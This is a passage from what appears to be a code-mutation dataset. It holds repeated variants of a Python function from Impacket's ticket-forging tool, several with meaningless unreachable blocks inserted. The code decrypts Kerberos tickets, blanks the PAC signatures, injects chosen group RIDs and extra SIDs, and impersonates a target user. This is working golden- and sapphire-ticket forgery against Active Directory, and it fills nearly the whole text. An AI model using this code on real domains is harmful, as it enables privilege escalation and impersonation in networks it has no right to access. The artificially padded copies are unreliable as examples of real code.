encRepPart['key']['keytype'] = encTicketPart['key']['keytype']\n    encRepPart['key']['keyvalue'] = encTicketPart['key']['keyvalue']\n    encRepPart['last-req'] = noValue\n    encRepPart['last-req'][0] = noValue\n    encRepPart['last-req'][0]['lr-type'] = 0\n    encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())\n    encRepPart['nonce'] = 123456789\n    encRepPart['key-expiration'] = KerberosTime.to_asn1(ticketDuration)\n    flags = []\n    for i in encTicketPart['flags']:\n        flags.append(i)\n    encRepPart['flags'] = flags\n    encRepPart['authtime'] = str(encTicketPart['authtime'])\n    encRepPart['endtime'] = str(encTicketPart['endtime'])\n    encRepPart['starttime'] = str(encTicketPart['starttime'])\n    encRepPart['renew-till'] = str(encTicketPart['renew-till'])\n    encRepPart['srealm'] = self.__domain.upper()\n    encRepPart['sname'] = noValue\n    encRepPart['sname']['name-string'] = noValue\n    encRepPart['sname']['name-string'][0] = self.__service\n    if self.__domain == self.__server:\n        encRepPart['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value\n        encRepPart['sname']['name-string'][1] = self.__domain.upper()\n        logging.info('\\tEncAsRepPart')\n    else:\n        encRepPart['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        encRepPart['sname']['name-string'][1] = self.__server\n        logging.info('\\tEncTGSRepPart')\n    return (encRepPart, encTicketPart, pacInfos)",
            "def customizeTicket(self, kdcRep, pacInfos):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    logging.info('Customizing ticket for %s/%s' % (self.__domain, self.__target))\n    ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))\n    if self.__options.impersonate:\n        logging.info(\"\\tRequesting S4U2self+U2U to obtain %s's PAC\" % self.__options.impersonate)\n        (tgs, cipher, oldSessionKey, sessionKey) = self.getKerberosS4U2SelfU2U()\n        logging.info('\\tDecrypting ticket & extracting PAC')\n        decodedTicket = decoder.decode(tgs, asn1Spec=TGS_REP())[0]\n        cipherText = decodedTicket['ticket']['enc-part']['cipher']\n        newCipher = _enctype_table[int(decodedTicket['ticket']['enc-part']['etype'])]\n        plainText = newCipher.decrypt(self.__tgt_session_key, 2, cipherText)\n        encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]\n        adIfRelevant = decoder.decode(encTicketPart['authorization-data'][0]['ad-data'], asn1Spec=AD_IF_RELEVANT())[0]\n        pacType = pac.PACTYPE(adIfRelevant[0]['ad-data'].asOctets())\n        pacInfos = dict()\n        buff = pacType['Buffers']\n        AttributesInfoPacInS4UU2UPAC = False\n        RequestorInfoPacInS4UU2UPAC = False\n        logging.info('\\tClearing signatures')\n        for bufferN in range(pacType['cBuffers']):\n            infoBuffer = pac.PAC_INFO_BUFFER(buff)\n            data = pacType['Buffers'][infoBuffer['Offset'] - 8:][:infoBuffer['cbBufferSize']]\n            buff = buff[len(infoBuffer):]\n            if infoBuffer['ulType'] in [PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM]:\n                checksum = PAC_SIGNATURE_DATA(data)\n                if checksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n                    checksum['Signature'] = '\\x00' * 12\n                elif checksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n                    checksum['Signature'] = '\\x00' * 12\n                else:\n                    checksum['Signature'] = '\\x00' * 16\n                pacInfos[infoBuffer['ulType']] = checksum.getData()\n            elif infoBuffer['ulType'] == PAC_ATTRIBUTES_INFO:\n                AttributesInfoPacInS4UU2UPAC = True\n                pacInfos[infoBuffer['ulType']] = data\n            elif infoBuffer['ulType'] == PAC_REQUESTOR_INFO:\n                RequestorInfoPacInS4UU2UPAC = True\n                pacInfos[infoBuffer['ulType']] = data\n            else:\n                pacInfos[infoBuffer['ulType']] = data\n        if self.__options.old_pac is False and (not AttributesInfoPacInS4UU2UPAC):\n            self.createAttributesInfoPac(pacInfos)\n        if self.__options.old_pac is False and (not RequestorInfoPacInS4UU2UPAC):\n            if self.__options.user_id == '500':\n                logging.warning(\"User ID is 500, which is Impacket's default. If you specified -user-id, you can ignore this message. If you didn't, and you get a KDC_ERR_TGT_REVOKED error when using the ticket, you will need to specify the -user-id with the RID of the target user to impersonate\")\n            self.createRequestorInfoPac(pacInfos)\n        logging.info('\\tAdding necessary ticket flags')\n        originalFlags = [i for (i, x) in enumerate(list(encTicketPart['flags'].asBinary())) if x == '1']\n        flags = originalFlags\n        newFlags = [TicketFlags.forwardable.value, TicketFlags.proxiable.value, TicketFlags.renewable.value, TicketFlags.pre_authent.value]\n        if self.__domain == self.__server:\n            newFlags.append(TicketFlags.initial.value)\n        for newFlag in newFlags:\n            if newFlag not in originalFlags:\n                flags.append(newFlag)\n        encTicketPart['flags'] = encodeFlags(flags)\n        logging.info('\\tChanging keytype')\n        encTicketPart['key']['keytype'] = kdcRep['ticket']['enc-part']['etype']\n        if encTicketPart['key']['keytype'] == EncryptionTypes.aes128_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n        elif encTicketPart['key']['keytype'] == EncryptionTypes.aes256_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])\n        else:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n    else:\n        encTicketPart = EncTicketPart()\n        flags = list()\n        flags.append(TicketFlags.forwardable.value)\n        flags.append(TicketFlags.proxiable.value)\n        flags.append(TicketFlags.renewable.value)\n        if self.__domain == self.__server:\n            flags.append(TicketFlags.initial.value)\n        flags.append(TicketFlags.pre_authent.value)\n        encTicketPart['flags'] = encodeFlags(flags)\n        encTicketPart['key'] = noValue\n        encTicketPart['key']['keytype'] = kdcRep['ticket']['enc-part']['etype']\n        if encTicketPart['key']['keytype'] == EncryptionTypes.aes128_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n        elif encTicketPart['key']['keytype'] == EncryptionTypes.aes256_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])\n        else:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n        encTicketPart['crealm'] = self.__domain.upper()\n        encTicketPart['cname'] = noValue\n        encTicketPart['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        encTicketPart['cname']['name-string'] = noValue\n        encTicketPart['cname']['name-string'][0] = self.__target\n        encTicketPart['transited'] = noValue\n        encTicketPart['transited']['tr-type'] = 0\n        encTicketPart['transited']['contents'] = ''\n        encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())\n        encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())\n        encTicketPart['endtime'] = KerberosTime.to_asn1(ticketDuration)\n        encTicketPart['renew-till'] = KerberosTime.to_asn1(ticketDuration)\n        encTicketPart['authorization-data'] = noValue\n        encTicketPart['authorization-data'][0] = noValue\n        encTicketPart['authorization-data'][0]['ad-type'] = AuthorizationDataType.AD_IF_RELEVANT.value\n        encTicketPart['authorization-data'][0]['ad-data'] = noValue\n        if PAC_LOGON_INFO in pacInfos:\n            data = pacInfos[PAC_LOGON_INFO]\n            validationInfo = VALIDATION_INFO()\n            validationInfo.fromString(pacInfos[PAC_LOGON_INFO])\n            lenVal = len(validationInfo.getData())\n            validationInfo.fromStringReferents(data, lenVal)\n            aTime = timegm(strptime(str(encTicketPart['authtime']), '%Y%m%d%H%M%SZ'))\n            unixTime = self.getFileTime(aTime)\n            kerbdata = KERB_VALIDATION_INFO()\n            kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 4294967295\n            kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32\n            validationInfo['Data']['LogonDomainName'] = self.__domain.upper()\n            validationInfo['Data']['EffectiveName'] = self.__target\n            groups = self.__options.groups.split(',')\n            validationInfo['Data']['GroupIds'] = list()\n            validationInfo['Data']['GroupCount'] = len(groups)\n            for group in groups:\n                groupMembership = GROUP_MEMBERSHIP()\n                groupId = NDRULONG()\n                groupId['Data'] = int(group)\n                groupMembership['RelativeId'] = groupId\n                groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED\n                validationInfo['Data']['GroupIds'].append(groupMembership)\n            if self.__options.extra_sid is not None:\n                extrasids = self.__options.extra_sid.split(',')\n                if validationInfo['Data']['SidCount'] == 0:\n                    validationInfo['Data']['UserFlags'] |= 32\n                    validationInfo['Data']['ExtraSids'] = PKERB_SID_AND_ATTRIBUTES_ARRAY()\n                for extrasid in extrasids:\n                    validationInfo['Data']['SidCount'] += 1\n                    sidRecord = KERB_SID_AND_ATTRIBUTES()\n                    sid = RPC_SID()\n                    sid.fromCanonical(extrasid)\n                    sidRecord['Sid'] = sid\n                    sidRecord['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED\n                    validationInfo['Data']['ExtraSids'].append(sidRecord)\n            else:\n                validationInfo['Data']['ExtraSids'] = NULL\n            validationInfoBlob = validationInfo.getData() + validationInfo.getDataReferents()\n            pacInfos[PAC_LOGON_INFO] = validationInfoBlob\n            if logging.getLogger().level == logging.DEBUG:\n                logging.debug('VALIDATION_INFO after making it gold')\n                validationInfo.dump()\n                print('\\n')\n        else:\n            raise Exception('PAC_LOGON_INFO not found! Aborting')\n        logging.info('\\tPAC_LOGON_INFO')\n        if PAC_SERVER_CHECKSUM in pacInfos:\n            serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])\n            if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n                serverChecksum['Signature'] = '\\x00' * 12\n            elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n                serverChecksum['Signature'] = '\\x00' * 12\n            else:\n                serverChecksum['Signature'] = '\\x00' * 16\n            pacInfos[PAC_SERVER_CHECKSUM] = serverChecksum.getData()\n        else:\n            raise Exception('PAC_SERVER_CHECKSUM not found! Aborting')\n        if PAC_PRIVSVR_CHECKSUM in pacInfos:\n            privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])\n            privSvrChecksum['Signature'] = '\\x00' * 12\n            if privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n                privSvrChecksum['Signature'] = '\\x00' * 12\n            elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n                privSvrChecksum['Signature'] = '\\x00' * 12\n            else:\n                privSvrChecksum['Signature'] = '\\x00' * 16\n            pacInfos[PAC_PRIVSVR_CHECKSUM] = privSvrChecksum.getData()\n        else:\n            raise Exception('PAC_PRIVSVR_CHECKSUM not found! Aborting')\n        if PAC_CLIENT_INFO_TYPE in pacInfos:\n            pacClientInfo = PAC_CLIENT_INFO(pacInfos[PAC_CLIENT_INFO_TYPE])\n            pacClientInfo['ClientId'] = unixTime\n            pacInfos[PAC_CLIENT_INFO_TYPE] = pacClientInfo.getData()\n        else:\n            raise Exception('PAC_CLIENT_INFO_TYPE not found! Aborting')\n        logging.info('\\tPAC_CLIENT_INFO_TYPE')\n        logging.info('\\tEncTicketPart')\n    if self.__domain == self.__server:\n        encRepPart = EncASRepPart()\n    else:\n        encRepPart = EncTGSRepPart()\n    encRepPart['key'] = noValue\n    encRepPart['key']['keytype'] = encTicketPart['key']['keytype']\n    encRepPart['key']['keyvalue'] = encTicketPart['key']['keyvalue']\n    encRepPart['last-req'] = noValue\n    encRepPart['last-req'][0] = noValue\n    encRepPart['last-req'][0]['lr-type'] = 0\n    encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())\n    encRepPart['nonce'] = 123456789\n    encRepPart['key-expiration'] = KerberosTime.to_asn1(ticketDuration)\n    flags = []\n    for i in encTicketPart['flags']:\n        flags.append(i)\n    encRepPart['flags'] = flags\n    encRepPart['authtime'] = str(encTicketPart['authtime'])\n    encRepPart['endtime'] = str(encTicketPart['endtime'])\n    encRepPart['starttime'] = str(encTicketPart['starttime'])\n    encRepPart['renew-till'] = str(encTicketPart['renew-till'])\n    encRepPart['srealm'] = self.__domain.upper()\n    encRepPart['sname'] = noValue\n    encRepPart['sname']['name-string'] = noValue\n    encRepPart['sname']['name-string'][0] = self.__service\n    if self.__domain == self.__server:\n        encRepPart['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value\n        encRepPart['sname']['name-string'][1] = self.__domain.upper()\n        logging.info('\\tEncAsRepPart')\n    else:\n        encRepPart['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        encRepPart['sname']['name-string'][1] = self.__server\n        logging.info('\\tEncTGSRepPart')\n    return (encRepPart, encTicketPart, pacInfos)",
            "def customizeTicket(self, kdcRep, pacInfos):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    logging.info('Customizing ticket for %s/%s' % (self.__domain, self.__target))\n    ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))\n    if self.__options.impersonate:\n        logging.info(\"\\tRequesting S4U2self+U2U to obtain %s's PAC\" % self.__options.impersonate)\n        (tgs, cipher, oldSessionKey, sessionKey) = self.getKerberosS4U2SelfU2U()\n        logging.info('\\tDecrypting ticket & extracting PAC')\n        decodedTicket = decoder.decode(tgs, asn1Spec=TGS_REP())[0]\n        cipherText = decodedTicket['ticket']['enc-part']['cipher']\n        newCipher = _enctype_table[int(decodedTicket['ticket']['enc-part']['etype'])]\n        plainText = newCipher.decrypt(self.__tgt_session_key, 2, cipherText)\n        encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]\n        adIfRelevant = decoder.decode(encTicketPart['authorization-data'][0]['ad-data'], asn1Spec=AD_IF_RELEVANT())[0]\n        pacType = pac.PACTYPE(adIfRelevant[0]['ad-data'].asOctets())\n        pacInfos = dict()\n        buff = pacType['Buffers']\n        AttributesInfoPacInS4UU2UPAC = False\n        RequestorInfoPacInS4UU2UPAC = False\n        logging.info('\\tClearing signatures')\n        for bufferN in range(pacType['cBuffers']):\n            infoBuffer = pac.PAC_INFO_BUFFER(buff)\n            data = pacType['Buffers'][infoBuffer['Offset'] - 8:][:infoBuffer['cbBufferSize']]\n            buff = buff[len(infoBuffer):]\n            if infoBuffer['ulType'] in [PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM]:\n                checksum = PAC_SIGNATURE_DATA(data)\n                if checksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n                    checksum['Signature'] = '\\x00' * 12\n                elif checksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n                    checksum['Signature'] = '\\x00' * 12\n                else:\n                    checksum['Signature'] = '\\x00' * 16\n                pacInfos[infoBuffer['ulType']] = checksum.getData()\n            elif infoBuffer['ulType'] == PAC_ATTRIBUTES_INFO:\n                AttributesInfoPacInS4UU2UPAC = True\n                pacInfos[infoBuffer['ulType']] = data\n            elif infoBuffer['ulType'] == PAC_REQUESTOR_INFO:\n                RequestorInfoPacInS4UU2UPAC = True\n                pacInfos[infoBuffer['ulType']] = data\n            else:\n                pacInfos[infoBuffer['ulType']] = data\n        if self.__options.old_pac is False and (not AttributesInfoPacInS4UU2UPAC):\n            self.createAttributesInfoPac(pacInfos)\n        if self.__options.old_pac is False and (not RequestorInfoPacInS4UU2UPAC):\n            if self.__options.user_id == '500':\n                logging.warning(\"User ID is 500, which is Impacket's default. If you specified -user-id, you can ignore this message. If you didn't, and you get a KDC_ERR_TGT_REVOKED error when using the ticket, you will need to specify the -user-id with the RID of the target user to impersonate\")\n            self.createRequestorInfoPac(pacInfos)\n        logging.info('\\tAdding necessary ticket flags')\n        originalFlags = [i for (i, x) in enumerate(list(encTicketPart['flags'].asBinary())) if x == '1']\n        flags = originalFlags\n        newFlags = [TicketFlags.forwardable.value, TicketFlags.proxiable.value, TicketFlags.renewable.value, TicketFlags.pre_authent.value]\n        if self.__domain == self.__server:\n            newFlags.append(TicketFlags.initial.value)\n        for newFlag in newFlags:\n            if newFlag not in originalFlags:\n                flags.append(newFlag)\n        encTicketPart['flags'] = encodeFlags(flags)\n        logging.info('\\tChanging keytype')\n        encTicketPart['key']['keytype'] = kdcRep['ticket']['enc-part']['etype']\n        if encTicketPart['key']['keytype'] == EncryptionTypes.aes128_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n        elif encTicketPart['key']['keytype'] == EncryptionTypes.aes256_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])\n        else:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n    else:\n        encTicketPart = EncTicketPart()\n        flags = list()\n        flags.append(TicketFlags.forwardable.value)\n        flags.append(TicketFlags.proxiable.value)\n        flags.append(TicketFlags.renewable.value)\n        if self.__domain == self.__server:\n            flags.append(TicketFlags.initial.value)\n        flags.append(TicketFlags.pre_authent.value)\n        encTicketPart['flags'] = encodeFlags(flags)\n        encTicketPart['key'] = noValue\n        encTicketPart['key']['keytype'] = kdcRep['ticket']['enc-part']['etype']\n        if encTicketPart['key']['keytype'] == EncryptionTypes.aes128_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n        elif encTicketPart['key']['keytype'] == EncryptionTypes.aes256_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])\n        else:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n        encTicketPart['crealm'] = self.__domain.upper()\n        encTicketPart['cname'] = noValue\n        encTicketPart['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        encTicketPart['cname']['name-string'] = noValue\n        encTicketPart['cname']['name-string'][0] = self.__target\n        encTicketPart['transited'] = noValue\n        encTicketPart['transited']['tr-type'] = 0\n        encTicketPart['transited']['contents'] = ''\n        encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())\n        encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())\n        encTicketPart['endtime'] = KerberosTime.to_asn1(ticketDuration)\n        encTicketPart['renew-till'] = KerberosTime.to_asn1(ticketDuration)\n        encTicketPart['authorization-data'] = noValue\n        encTicketPart['authorization-data'][0] = noValue\n        encTicketPart['authorization-data'][0]['ad-type'] = AuthorizationDataType.AD_IF_RELEVANT.value\n        encTicketPart['authorization-data'][0]['ad-data'] = noValue\n        if PAC_LOGON_INFO in pacInfos:\n            data = pacInfos[PAC_LOGON_INFO]\n            validationInfo = VALIDATION_INFO()\n            validationInfo.fromString(pacInfos[PAC_LOGON_INFO])\n            lenVal = len(validationInfo.getData())\n            validationInfo.fromStringReferents(data, lenVal)\n            aTime = timegm(strptime(str(encTicketPart['authtime']), '%Y%m%d%H%M%SZ'))\n            unixTime = self.getFileTime(aTime)\n            kerbdata = KERB_VALIDATION_INFO()\n            kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 4294967295\n            kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32\n            validationInfo['Data']['LogonDomainName'] = self.__domain.upper()\n            validationInfo['Data']['EffectiveName'] = self.__target\n            groups = self.__options.groups.split(',')\n            validationInfo['Data']['GroupIds'] = list()\n            validationInfo['Data']['GroupCount'] = len(groups)\n            for group in groups:\n                groupMembership = GROUP_MEMBERSHIP()\n                groupId = NDRULONG()\n                groupId['Data'] = int(group)\n                groupMembership['RelativeId'] = groupId\n                groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED\n                validationInfo['Data']['GroupIds'].append(groupMembership)\n            if self.__options.extra_sid is not None:\n                extrasids = self.__options.extra_sid.split(',')\n                if validationInfo['Data']['SidCount'] == 0:\n                    validationInfo['Data']['UserFlags'] |= 32\n                    validationInfo['Data']['ExtraSids'] = PKERB_SID_AND_ATTRIBUTES_ARRAY()\n                for extrasid in extrasids:\n                    validationInfo['Data']['SidCount'] += 1\n                    sidRecord = KERB_SID_AND_ATTRIBUTES()\n                    sid = RPC_SID()\n                    sid.fromCanonical(extrasid)\n                    sidRecord['Sid'] = sid\n                    sidRecord['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED\n                    validationInfo['Data']['ExtraSids'].append(sidRecord)\n            else:\n                validationInfo['Data']['ExtraSids'] = NULL\n            validationInfoBlob = validationInfo.getData() + validationInfo.getDataReferents()\n            pacInfos[PAC_LOGON_INFO] = validationInfoBlob\n            if logging.getLogger().level == logging.DEBUG:\n                logging.debug('VALIDATION_INFO after making it gold')\n                validationInfo.dump()\n                print('\\n')\n        else:\n            raise Exception('PAC_LOGON_INFO not found! Aborting')\n        logging.info('\\tPAC_LOGON_INFO')\n        if PAC_SERVER_CHECKSUM in pacInfos:\n            serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])\n            if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n                serverChecksum['Signature'] = '\\x00' * 12\n            elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n                serverChecksum['Signature'] = '\\x00' * 12\n            else:\n                serverChecksum['Signature'] = '\\x00' * 16\n            pacInfos[PAC_SERVER_CHECKSUM] = serverChecksum.getData()\n        else:\n            raise Exception('PAC_SERVER_CHECKSUM not found! Aborting')\n        if PAC_PRIVSVR_CHECKSUM in pacInfos:\n            privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])\n            privSvrChecksum['Signature'] = '\\x00' * 12\n            if privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n                privSvrChecksum['Signature'] = '\\x00' * 12\n            elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n                privSvrChecksum['Signature'] = '\\x00' * 12\n            else:\n                privSvrChecksum['Signature'] = '\\x00' * 16\n            pacInfos[PAC_PRIVSVR_CHECKSUM] = privSvrChecksum.getData()\n        else:\n            raise Exception('PAC_PRIVSVR_CHECKSUM not found! Aborting')\n        if PAC_CLIENT_INFO_TYPE in pacInfos:\n            pacClientInfo = PAC_CLIENT_INFO(pacInfos[PAC_CLIENT_INFO_TYPE])\n            pacClientInfo['ClientId'] = unixTime\n            pacInfos[PAC_CLIENT_INFO_TYPE] = pacClientInfo.getData()\n        else:\n            raise Exception('PAC_CLIENT_INFO_TYPE not found! Aborting')\n        logging.info('\\tPAC_CLIENT_INFO_TYPE')\n        logging.info('\\tEncTicketPart')\n    if self.__domain == self.__server:\n        encRepPart = EncASRepPart()\n    else:\n        encRepPart = EncTGSRepPart()\n    encRepPart['key'] = noValue\n    encRepPart['key']['keytype'] = encTicketPart['key']['keytype']\n    encRepPart['key']['keyvalue'] = encTicketPart['key']['keyvalue']\n    encRepPart['last-req'] = noValue\n    encRepPart['last-req'][0] = noValue\n    encRepPart['last-req'][0]['lr-type'] = 0\n    encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())\n    encRepPart['nonce'] = 123456789\n    encRepPart['key-expiration'] = KerberosTime.to_asn1(ticketDuration)\n    flags = []\n    for i in encTicketPart['flags']:\n        flags.append(i)\n    encRepPart['flags'] = flags\n    encRepPart['authtime'] = str(encTicketPart['authtime'])\n    encRepPart['endtime'] = str(encTicketPart['endtime'])\n    encRepPart['starttime'] = str(encTicketPart['starttime'])\n    encRepPart['renew-till'] = str(encTicketPart['renew-till'])\n    encRepPart['srealm'] = self.__domain.upper()\n    encRepPart['sname'] = noValue\n    encRepPart['sname']['name-string'] = noValue\n    encRepPart['sname']['name-string'][0] = self.__service\n    if self.__domain == self.__server:\n        encRepPart['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value\n        encRepPart['sname']['name-string'][1] = self.__domain.upper()\n        logging.info('\\tEncAsRepPart')\n    else:\n        encRepPart['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value\n        encRepPart['sname']['name-string'][1] = self.__server\n        logging.info('\\tEncTGSRepPart')\n    return (encRepPart, encTicketPart, pacInfos)",
            "def customizeTicket(self, kdcRep, pacInfos):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    logging.info('Customizing ticket for %s/%s' % (self.__domain, self.__target))\n    ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))\n    if self.__options.impersonate:\n        logging.info(\"\\tRequesting S4U2self+U2U to obtain %s's PAC\" % self.__options.impersonate)\n        (tgs, cipher, oldSessionKey, sessionKey) = self.getKerberosS4U2SelfU2U()\n        logging.info('\\tDecrypting ticket & extracting PAC')\n        decodedTicket = decoder.decode(tgs, asn1Spec=TGS_REP())[0]\n        cipherText = decodedTicket['ticket']['enc-part']['cipher']\n        newCipher = _enctype_table[int(decodedTicket['ticket']['enc-part']['etype'])]\n        plainText = newCipher.decrypt(self.__tgt_session_key, 2, cipherText)\n        encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]\n        adIfRelevant = decoder.decode(encTicketPart['authorization-data'][0]['ad-data'], asn1Spec=AD_IF_RELEVANT())[0]\n        pacType = pac.PACTYPE(adIfRelevant[0]['ad-data'].asOctets())\n        pacInfos = dict()\n        buff = pacType['Buffers']\n        AttributesInfoPacInS4UU2UPAC = False\n        RequestorInfoPacInS4UU2UPAC = False\n        logging.info('\\tClearing signatures')\n        for bufferN in range(pacType['cBuffers']):\n            infoBuffer = pac.PAC_INFO_BUFFER(buff)\n            data = pacType['Buffers'][infoBuffer['Offset'] - 8:][:infoBuffer['cbBufferSize']]\n            buff = buff[len(infoBuffer):]\n            if infoBuffer['ulType'] in [PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM]:\n                checksum = PAC_SIGNATURE_DATA(data)\n                if checksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n                    checksum['Signature'] = '\\x00' * 12\n                elif checksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n                    checksum['Signature'] = '\\x00' * 12\n                else:\n                    checksum['Signature'] = '\\x00' * 16\n                pacInfos[infoBuffer['ulType']] = checksum.getData()\n            elif infoBuffer['ulType'] == PAC_ATTRIBUTES_INFO:\n                AttributesInfoPacInS4UU2UPAC = True\n                pacInfos[infoBuffer['ulType']] = data\n            elif infoBuffer['ulType'] == PAC_REQUESTOR_INFO:\n                RequestorInfoPacInS4UU2UPAC = True\n                pacInfos[infoBuffer['ulType']] = data\n            else:\n                pacInfos[infoBuffer['ulType']] = data\n        if self.__options.old_pac is False and (not AttributesInfoPacInS4UU2UPAC):\n            self.createAttributesInfoPac(pacInfos)\n        if self.__options.old_pac is False and (not RequestorInfoPacInS4UU2UPAC):\n            if self.__options.user_id == '500':\n                logging.warning(\"User ID is 500, which is Impacket's default. If you specified -user-id, you can ignore this message. If you didn't, and you get a KDC_ERR_TGT_REVOKED error when using the ticket, you will need to specify the -user-id with the RID of the target user to impersonate\")\n            self.createRequestorInfoPac(pacInfos)\n        logging.info('\\tAdding necessary ticket flags')\n        originalFlags = [i for (i, x) in enumerate(list(encTicketPart['flags'].asBinary())) if x == '1']\n        flags = originalFlags\n        newFlags = [TicketFlags.forwardable.value, TicketFlags.proxiable.value, TicketFlags.renewable.value, TicketFlags.pre_authent.value]\n        if self.__domain == self.__server:\n            newFlags.append(TicketFlags.initial.value)\n        for newFlag in newFlags:\n            if newFlag not in originalFlags:\n                flags.append(newFlag)\n        encTicketPart['flags'] = encodeFlags(flags)\n        logging.info('\\tChanging keytype')\n        encTicketPart['key']['keytype'] = kdcRep['ticket']['enc-part']['etype']\n        if encTicketPart['key']['keytype'] == EncryptionTypes.aes128_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n        elif encTicketPart['key']['keytype'] == EncryptionTypes.aes256_cts_hmac_sha1_96.value:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])\n        else:\n            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])\n    else:\n        encTicketPart = EncTicketPart()\n        flags = list()\n        flags.append(TicketFlags.forwardable.value)\n        flags.append(TicketFlags.proxiable.value)\n        flags.append(TicketFlags.renewable.value)\n        if self.__domain == self.__server:\n            flags.append(TicketFlags.initial.value)\n        flags.append(TicketFlags.pre_authent.value)\n        encTicketPart['flags'] = encodeFlags(flags)\n        encTicketPart['key'] = noValue\n        encTicketPart['key']['keytype'] = kdcRep['ticket']['enc-part']['etype']\n        if encTicketPart['key']['keytype'] == EncryptionTypes.aes128_cts_hmac_sha1_96.value:\n            